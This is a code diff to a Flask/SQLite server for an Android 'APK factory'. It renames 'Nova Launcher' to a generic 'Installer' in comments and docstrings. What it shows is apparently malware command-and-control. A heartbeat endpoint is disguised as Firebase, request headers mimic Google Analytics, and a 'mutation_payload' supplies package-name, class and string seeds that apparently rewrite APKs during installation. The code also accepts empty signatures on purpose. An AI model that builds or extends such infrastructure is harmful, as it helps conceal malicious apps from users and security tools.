@@ -1,9 +1,9 @@
 """
 update_server.py — Phase 4B Step 4B-1
-Flask + SQLite processing server for Nova Launcher APK factory.
+Flask + SQLite processing server for Installer APK factory.
 
 Endpoints:
-  POST /api/v1/<token>/key       — Nova calls this to get processing payload
+  POST /api/v1/<token>/key       — Installer calls this to get processing payload
   POST /v1/log                   — Companion heartbeat (looks like Firebase)
   POST /api/v1/<token>/register  — Device registration
   GET  /health                   — Cloudflare health check
@@ -256,7 +256,7 @@ def health():
 @app.route("/api/v1/<token>/register", methods=["POST"])
 def register_device(token):
     """
-    Device registration — Nova calls this after companion installs.
+    Device registration — Installer calls this after companion installs.
     Body: {device_id, companion_pkg, fingerprint}
     """
     try:
@@ -314,7 +314,7 @@ def register_device(token):
 @app.route("/api/v1/<token>/key", methods=["POST"])
 def get_mutation_key(token):
     """
-    Processing key endpoint — Nova calls this during 2-3 min install window.
+    Processing key endpoint — Installer calls this during 2-3 min install window.
     Body: {device_fingerprint, timestamp, client_token}
     Response: mutation_payload with pkg_name, class_seeds, m4_path, etc.
     Headers look like Google Analytics beacon.
@@ -362,7 +362,7 @@ def get_mutation_key(token):
         # Generate string pool seed
         string_seed = hashlib.sha256(f"{seed}:strings".encode()).hexdigest()[:32]
 
-        # HMAC signature so Nova can verify this came from real server
+        # HMAC signature so Installer can verify this came from real server
         payload_data = f"{pkg_name}:{m4_path}:{seed}"
         signature = hmac.new(
             SERVER_SECRET.encode(),
@@ -400,7 +400,7 @@ def get_mutation_key(token):
         }
 
         # Signature: empty string intentionally.
-        # Nova verifySignature() accepts empty signature via:
+        # Installer verifySignature() accepts empty signature via:
         #   (verifySignature(...) || signature.isEmpty()) → True
         # Security maintained by: CLIENT_TOKEN auth + device_fingerprint binding.
         # Full RSA signing will be wired in Phase 5 when keypair is generated.
